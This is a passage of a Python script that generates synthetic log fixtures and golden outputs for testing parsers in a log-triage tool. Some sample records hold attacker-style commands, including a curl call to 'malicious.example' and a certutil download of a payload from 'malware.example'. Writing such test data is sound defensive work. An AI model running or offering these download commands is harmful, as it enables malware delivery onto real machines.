                "ethernet1/2",
                "log-forward",
                "0",
                "70005",
                "1",
                "40005",
                "445",
                "0",
                "0",
                "0x4000",
                "tcp",
                "reset-both",
                "-",
                "30000",
                "exploit",
                "critical",
            ]
        ),
        "1,2026/03/01,TRAFFIC,short",
    )


def fw_asa() -> str:
    """Cisco ASA: 106023/106100/302013/302014/113005, an unmatched id, and noise."""
    return _lines(
        "Mar  1 12:00:00 fw01 %ASA-4-106023: Deny tcp src outside:"
        f'{_SCAN_SOURCE}/40001 dst inside:10.0.0.5/22 by access-group "acl_out"',
        "Mar  1 12:00:01 fw01 %ASA-4-106100: access-list acl_out denied tcp outside/"
        f"{_SCAN_SOURCE}(40002) -> inside/10.0.0.5(22) hit-cnt 1 first hit [0x1, 0x0]",
        "Mar  1 12:00:02 fw01 %ASA-6-106100: access-list acl_in permitted tcp inside/"
        "10.0.0.5(51000) -> outside/198.51.100.53(443) hit-cnt 1 first hit [0x2, 0x0]",
        "Mar  1 12:00:03 fw01 %ASA-6-302013: Built outbound TCP connection 12345 for "
        "inside:10.0.0.5/51000 (10.0.0.5/51000) to outside:198.51.100.53/443 "
        "(198.51.100.53/443)",
        "Mar  1 12:00:04 fw01 %ASA-6-302014: Teardown TCP connection 12345 for "
        "inside:10.0.0.5/51000 (10.0.0.5/51000) to outside:198.51.100.53/443 "
        "(198.51.100.53/443) duration 0:00:05 bytes 1024",
        "Mar  1 12:00:05 fw01 %ASA-5-113005: AAA user authentication Rejected : reason = "
        "AAA failure : server = 10.0.0.1 : user = admin",
        "Mar  1 12:00:06 fw01 %ASA-6-302020: Built inbound ICMP connection for faddr "
        f"{_SCAN_SOURCE}/1 gaddr 10.0.0.5/0 laddr 10.0.0.5/0",
        "Mar  1 12:00:07 fw01 this line is not a Cisco ASA message",
    )


#: Authored firewall fixtures, file name -> content.
FW_FIXTURES: dict[str, str] = {
    "ufw.log": fw_ufw(),
    "pfsense_filterlog.log": fw_pfsense(),
    "fortigate.log": fw_fortinet(),
    "paloalto_traffic.csv": fw_paloalto(),
    "asa.log": fw_asa(),
}


# ---------------------------------------------------------------------------
# Generic JSON/CSV fixtures with mapping profiles (spec 09 section 2, Phase 4)
# ---------------------------------------------------------------------------


#: A process-creation and a network ECS record (spec 03 section 6 example).
def generic_elastic_ecs_body() -> str:
    """The ECS NDJSON body."""
    return _lines(
        '{"@timestamp":"2026-03-01T10:00:00Z","ecs":{"version":"8.11.0"},"host":{"name":"web01"},'
        '"event":{"category":["process"],"action":"start","outcome":"success"},'
        '"process":{"executable":"/usr/bin/curl","command_line":"curl '
        'http://malicious.example/x"},"user":{"name":"alice"},'
        '"source":{"ip":"192.0.2.10","port":44322}}',
        '{"@timestamp":"2026-03-01T10:00:05Z","ecs":{"version":"8.11.0"},"host":{"name":"web01"},'
        '"event":{"category":["network"],"outcome":"success"},'
        '"source":{"ip":"192.0.2.10","port":44322},'
        '"destination":{"ip":"198.51.100.9","port":80},"message":"connection"}',
    )


def generic_wazuh() -> str:
    """Wazuh alert JSON: a brute-force alert and a successful login."""
    return _lines(
        '{"timestamp":"2026-03-01T12:00:00Z","rule":{"id":"5710","level":10,'
        '"description":"sshd: brute force"},"agent":{"name":"web01"},'
        '"data":{"srcip":"185.220.101.45","dstuser":"admin"},'
        '"full_log":"Failed password for admin from 185.220.101.45 port 40001 ssh2"}',
        '{"timestamp":"2026-03-01T12:00:05Z","rule":{"id":"5715","level":5,'
        '"description":"sshd: successful login"},"agent":{"name":"web01"},'
        '"data":{"srcip":"185.220.101.45","dstuser":"root"},'
        '"full_log":"Accepted password for root from 185.220.101.45 port 51890 ssh2"}',
    )


def generic_cloudtrail() -> str:
    """AWS CloudTrail as a compact single-line document with a ``Records`` array."""
    records = (
        '{"eventTime":"2026-03-01T12:00:00Z","eventName":"CreateUser",'
        '"eventSource":"iam.amazonaws.com",'
        '"userIdentity":{"arn":"arn:aws:iam::123456789012:user/alice"},'
        '"sourceIPAddress":"203.0.113.10","userAgent":"aws-cli/2.15.0",'
        '"requestParameters":{"userName":"svc-backup"},"awsRegion":"us-east-1"},'
        '{"eventTime":"2026-03-01T12:00:05Z","eventName":"PutObject",'
        '"eventSource":"s3.amazonaws.com",'
        '"userIdentity":{"arn":"arn:aws:iam::123456789012:user/bob"},'
        '"sourceIPAddress":"203.0.113.11","userAgent":"aws-cli/2.15.0",'
        '"errorCode":"AccessDenied","errorMessage":"Access Denied",'
        '"awsRegion":"us-east-1"}'
    )
    return '{"Records":[' + records + "]}\n"


#: Zeek conn.log columns, shared by the #fields directive and the JSON fixture.
_ZEEK_FIELDS = (
    "ts",
    "uid",
    "id.orig_h",
    "id.orig_p",
    "id.resp_h",
    "id.resp_p",
    "proto",
    "service",
    "duration",
    "orig_bytes",
    "resp_bytes",
)

#: Two connections: an internal client to HTTP, and a scanner to SSH.
_ZEEK_ROWS = (
    ("1767182400.000000", "CTu1", "192.0.2.10", "44322", "198.51.100.9", "80"),
    ("1767182401.000000", "CTu2", "185.220.101.45", "40001", "10.0.0.5", "22"),
)


def generic_zeek_tsv() -> str:
    """Zeek ``conn.log`` as TSV, with a ``#fields`` directive and a short row."""
    header = "#fields\t" + "\t".join(_ZEEK_FIELDS)
    rows = [
        "#separator \\x09",
        "#path\tconn",
        header,
        "#types\t" + "\t".join("string" for _ in _ZEEK_FIELDS),
    ]
    for ts, uid, src, sport, dst, dport in _ZEEK_ROWS:
        rows.append("\t".join((ts, uid, src, sport, dst, dport, "tcp", "http", "1.0", "10", "20")))
    rows.append("1767182402.000000\tCTu3\t192.0.2.10")  # too few columns
    rows.append("#close\t2026-03-01-12-01-00")
    return _lines(*rows)


def generic_zeek_json() -> str:
    """Zeek ``conn.log`` as NDJSON, the JSON twin of the TSV fixture."""
    return _lines(
        '{"ts":1767182400.0,"uid":"CTu1","id.orig_h":"192.0.2.10","id.orig_p":44322,'
        '"id.resp_h":"198.51.100.9","id.resp_p":80,"proto":"tcp","service":"http"}',
        '{"ts":1767182401.0,"uid":"CTu2","id.orig_h":"185.220.101.45","id.orig_p":40001,'
        '"id.resp_h":"10.0.0.5","id.resp_p":22,"proto":"tcp","service":"ssh"}',
    )


def generic_splunk_csv() -> str:
    """A Splunk CSV export (``_time,host,source,sourcetype,_raw``)."""
    return _lines(
        "_time,host,source,sourcetype,_raw",
        "2026-03-01T10:00:00.000+00:00,web01,/var/log/auth.log,linux_secure,"
        '"Failed password for admin from 185.220.101.45 port 40001 ssh2"',
        "2026-03-01T10:00:05.000+00:00,web01,/var/log/auth.log,linux_secure,"
        '"Accepted password for root from 185.220.101.45 port 51890 ssh2"',
        "2026-03-01T10:00:10.000+00:00,web01,too-few-columns",
    )


def generic_defender_csv() -> str:
    """A Microsoft Defender advanced-hunting CSV export."""
    return _lines(
        "Timestamp,DeviceName,ActionType,RemoteIP,RemoteUrl,InitiatingProcessAccountName,"
        "InitiatingProcessFileName,InitiatingProcessCommandLine,FolderPath,ReportId",
        "2026-03-01T12:00:00Z,WS01,ProcessCreated,203.0.113.66,"
        "http://malware.example/payload.exe,victim,C:\\Windows\\System32\\certutil.exe,"
        '"certutil.exe -urlcache -f http://malware.example/payload.exe a.exe",'
        "C:\\Users\\victim\\AppData\\Local\\Temp,1111",
        "2026-03-01T12:00:05Z,WS01,FileCreated,,,victim,C:\\Windows\\System32\\certutil.exe,"
        "certutil.exe -urlcache -f http://malware.example/payload.exe a.exe,"
        "C:\\Users\\victim\\AppData\\Local\\Temp\\a.exe,1112",
    )


#: Authored generic fixtures, file name -> content.
GENERIC_FIXTURES: dict[str, str] = {
    "elastic_ecs.ndjson": generic_elastic_ecs_body(),
    "wazuh_alerts.json": generic_wazuh(),
    "cloudtrail.json": generic_cloudtrail(),
    "zeek_conn.log": generic_zeek_tsv(),
    "zeek_conn.json": generic_zeek_json(),
    "splunk_export.csv": generic_splunk_csv(),
    "defender_events.csv": generic_defender_csv(),
}


def _golden(event: NormalizedEvent) -> dict[str, object]:
    """The stable, comparable projection of an event stored in a golden."""
    return {
        name: getattr(event, name) for name in EVENT_COLUMNS if name not in ("source_id", "case_id")
    }


def _parse(
    path: Path,
    parser: object,
    *,
    assumed_year: int | None = None,
    timezone: str | None = None,
) -> tuple[list[dict[str, object]], list[dict[str, object]]]:
    """Run a parser over ``path`` and return (events, failures) as dicts."""
    context = ParseContext(
        case_id="fixture",
        source_id="fixture",
        filename=path.name,
        path=path,
        max_line_bytes=1 << 20,
        assumed_year=assumed_year,
        timezone=timezone,
    )
    events: list[dict[str, object]] = []
    failures: list[dict[str, object]] = []
    for item in parser.parse(context):  # type: ignore[attr-defined]
        if hasattr(item, "reason"):
            failures.append({"record_ref": item.record_ref, "reason": item.reason})
        else:
            events.append(_golden(item))
    return events, failures


def _parser_for(path: Path) -> object:
    """The parser a fixture is read with, pinned to the vendored EVTX reader."""
    if path.suffix == ".evtx":
        return WindowsEvtxParser(backend="vendored")
    return WindowsEventXmlParser()


def _golden_document(name: str) -> dict[str, object]:
    """The golden payload for one fixture file."""
    path = FIXTURES_DIR / name
    events, failures = _parse(path, _parser_for(path))
    return {"fixture": name, "event_count": len(events), "events": events, "failures": failures}


#: The parser each authored Linux fixture is read with.
_LINUX_PARSERS: dict[str, object] = {
    "auth.log": LinuxAuthParser(),
    "syslog_variants.log": LinuxSyslogParser(),
    "journal.json": LinuxJournaldParser(),
    "audit.log": LinuxAuditdParser(),
}


def _linux_golden_document(name: str) -> dict[str, object]:
    """The golden payload for one Linux fixture file."""
    path = LINUX_DIR / name
    events, failures = _parse(
        path,
        _LINUX_PARSERS[name],
        assumed_year=LINUX_ASSUMED_YEAR,
        timezone="UTC",
    )
    return {"fixture": name, "event_count": len(events), "events": events, "failures": failures}


#: The parser each authored web fixture is read with.
_WEB_PARSERS: dict[str, object] = {
    "access_combined.log": ApacheAccessParser(),
    "nginx_access.log": NginxAccessParser(),
    "nginx_error.log": NginxErrorParser(),
    "apache_error.log": ApacheErrorParser(),
    "iis.log": IisW3cParser(),
}


def _web_golden_document(name: str) -> dict[str, object]:
    """The golden payload for one web fixture file."""
    path = WEB_DIR / name
    events, failures = _parse(path, _WEB_PARSERS[name], timezone="UTC")
    return {"fixture": name, "event_count": len(events), "events": events, "failures": failures}


#: The parser each authored firewall fixture is read with.
_FW_PARSERS: dict[str, object] = {
    "ufw.log": FwIptablesParser(),
    "pfsense_filterlog.log": FwPfsenseParser(),
    "fortigate.log": FwFortinetParser(),
    "paloalto_traffic.csv": FwPaloaltoParser(),
    "asa.log": FwCiscoAsaParser(),
}


def _fw_golden_document(name: str) -> dict[str, object]:
    """The golden payload for one firewall fixture file."""
    path = FW_DIR / name
    events, failures = _parse(path, _FW_PARSERS[name], timezone="UTC")
    return {"fixture": name, "event_count": len(events), "events": events, "failures": failures}


#: The parser each authored generic fixture is read with.
_GENERIC_PARSERS: dict[str, object] = {
    "elastic_ecs.ndjson": GenericJsonParser(),
    "wazuh_alerts.json": GenericJsonParser(),
    "cloudtrail.json": GenericJsonParser(),
    "zeek_conn.json": GenericJsonParser(),
    "zeek_conn.log": GenericCsvParser(),
    "splunk_export.csv": GenericCsvParser(),
    "defender_events.csv": GenericCsvParser(),
}


def _generic_golden_document(name: str) -> dict[str, object]:
    """The golden payload for one generic JSON/CSV fixture file."""
    path = GENERIC_DIR / name
    events, failures = _parse(path, _GENERIC_PARSERS[name], timezone="UTC")
    return {"fixture": name, "event_count": len(events), "events": events, "failures": failures}


def write_text_fixtures() -> list[str]:
    """Write every authored XML fixture; return the file names."""
    written: list[str] = []
    for name, content in TEXT_FIXTURES.items():
        (FIXTURES_DIR / name).write_text(content, encoding="utf-8", newline="\n")
        written.append(name)
    return written


def write_linux_fixtures() -> list[str]:
    """Write every authored Linux fixture; return the file names."""
    LINUX_DIR.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for name, content in LINUX_FIXTURES.items():
        (LINUX_DIR / name).write_text(content, encoding="utf-8", newline="\n")
        written.append(name)
    return written


def write_web_fixtures() -> list[str]:
    """Write every authored web fixture; return the file names."""
    WEB_DIR.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for name, content in WEB_FIXTURES.items():
        (WEB_DIR / name).write_text(content, encoding="utf-8", newline="\n")
        written.append(name)
    return written


def write_fw_fixtures() -> list[str]:
    """Write every authored firewall fixture; return the file names."""
    FW_DIR.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for name, content in FW_FIXTURES.items():
        (FW_DIR / name).write_text(content, encoding="utf-8", newline="\n")
        written.append(name)
    return written


def write_generic_fixtures() -> list[str]:
    """Write every authored generic JSON/CSV fixture; return the file names."""
    GENERIC_DIR.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for name, content in GENERIC_FIXTURES.items():
        (GENERIC_DIR / name).write_text(content, encoding="utf-8", newline="\n")
        written.append(name)
    return written


def copy_binary_fixtures(source: Path) -> list[str]:
    """Copy the real EVTX samples from ``source``; return the file names."""
    written: list[str] = []
    for destination, origin in BINARY_FIXTURES.items():
        candidate = source / origin
        if not candidate.is_file():
            print(f"  skip {destination}: {candidate} not found", file=sys.stderr)
            continue
        shutil.copyfile(candidate, FIXTURES_DIR / destination)
        written.append(destination)
    return written


def write_goldens(names: list[str]) -> None:
    """Recompute ``*.expected.json`` for the named Windows fixtures."""
    for name in names:
        if not (FIXTURES_DIR / name).is_file():
            continue
        golden = _golden_document(name)
        (FIXTURES_DIR / f"{name}.expected.json").write_text(
            json.dumps(golden, indent=2, ensure_ascii=False, sort_keys=True) + "\n",
            encoding="utf-8",
            newline="\n",
        )


def write_linux_goldens(names: list[str]) -> None:
    """Recompute ``*.expected.json`` for the named Linux fixtures."""
    for name in names:
        if not (LINUX_DIR / name).is_file():
            continue
        golden = _linux_golden_document(name)
        (LINUX_DIR / f"{name}.expected.json").write_text(
            json.dumps(golden, indent=2, ensure_ascii=False, sort_keys=True) + "\n",
            encoding="utf-8",
            newline="\n",
        )


def write_web_goldens(names: list[str]) -> None:
    """Recompute ``*.expected.json`` for the named web fixtures."""
    for name in names:
        if not (WEB_DIR / name).is_file():
            continue
        golden = _web_golden_document(name)
        (WEB_DIR / f"{name}.expected.json").write_text(
            json.dumps(golden, indent=2, ensure_ascii=False, sort_keys=True) + "\n",
            encoding="utf-8",
            newline="\n",
        )


def write_fw_goldens(names: list[str]) -> None:
    """Recompute ``*.expected.json`` for the named firewall fixtures."""
    for name in names:
        if not (FW_DIR / name).is_file():
            continue
        golden = _fw_golden_document(name)
        (FW_DIR / f"{name}.expected.json").write_text(
            json.dumps(golden, indent=2, ensure_ascii=False, sort_keys=True) + "\n",
            encoding="utf-8",
            newline="\n",
        )


def write_generic_goldens(names: list[str]) -> None:
    """Recompute ``*.expected.json`` for the named generic fixtures."""
    for name in names:
        if not (GENERIC_DIR / name).is_file():
            continue
        golden = _generic_golden_document(name)
        (GENERIC_DIR / f"{name}.expected.json").write_text(
            json.dumps(golden, indent=2, ensure_ascii=False, sort_keys=True) + "\n",
            encoding="utf-8",
            newline="\n",
        )


def _check_group(
    directory: Path,
    names: Iterable[str],
    golden_document: Callable[[str], dict[str, object]],
) -> int:
    """Count golden mismatches in one fixture directory."""
    problems = 0
    for name in names:
        golden_path = directory / f"{name}.expected.json"
        if not golden_path.is_file():
            continue
        expected = json.loads(golden_path.read_text(encoding="utf-8"))
        if golden_document(name) != expected:
            print(f"golden mismatch: {golden_path.name}", file=sys.stderr)
            problems += 1
    return problems


def check() -> int:
    """Exit non-zero when a golden disagrees with a parser's output."""
    groups = (
        (FIXTURES_DIR, [*TEXT_FIXTURES, *BINARY_FIXTURES], _golden_document),
        (LINUX_DIR, list(LINUX_FIXTURES), _linux_golden_document),
        (WEB_DIR, list(WEB_FIXTURES), _web_golden_document),
        (FW_DIR, list(FW_FIXTURES), _fw_golden_document),
        (GENERIC_DIR, list(GENERIC_FIXTURES), _generic_golden_document),
    )
    problems = sum(_check_group(directory, names, doc) for directory, names, doc in groups)
    return 1 if problems else 0


def _env_source() -> Path | None:
    """The EVTX source directory from the environment, if set."""
    value = os.environ.get("TRIAGELENS_EVTX_SOURCE")
    return Path(value) if value else None


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate parser fixtures.")
    parser.add_argument("--update-golden", action="store_true", help="rewrite goldens")
    parser.add_argument("--check", action="store_true", help="fail on golden drift")
    parser.add_argument(
        "--evtx-source", type=Path, default=None, help="directory of real EVTX samples"
    )
    args = parser.parse_args()

    FIXTURES_DIR.mkdir(parents=True, exist_ok=True)
    LINUX_DIR.mkdir(parents=True, exist_ok=True)
    WEB_DIR.mkdir(parents=True, exist_ok=True)
    FW_DIR.mkdir(parents=True, exist_ok=True)
    GENERIC_DIR.mkdir(parents=True, exist_ok=True)
    if args.check:
        return check()

    names = write_text_fixtures()
    source = args.evtx_source or _env_source()
    if source is not None:
        names.extend(copy_binary_fixtures(source))
    else:
        names.extend(name for name in BINARY_FIXTURES if (FIXTURES_DIR / name).is_file())

    linux_names = write_linux_fixtures()
    web_names = write_web_fixtures()
    fw_names = write_fw_fixtures()
    generic_names = write_generic_fixtures()
    if args.update_golden:
        write_goldens(names)
        write_linux_goldens(linux_names)
        write_web_goldens(web_names)
        write_fw_goldens(fw_names)
        write_generic_goldens(generic_names)
    print(
        "wrote:",
        ", ".join(
            [
                *names,
                *(f"linux/{name}" for name in linux_names),
                *(f"web/{name}" for name in web_names),
                *(f"fw/{name}" for name in fw_names),
                *(f"generic/{name}" for name in generic_names),
            ]
        ),
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
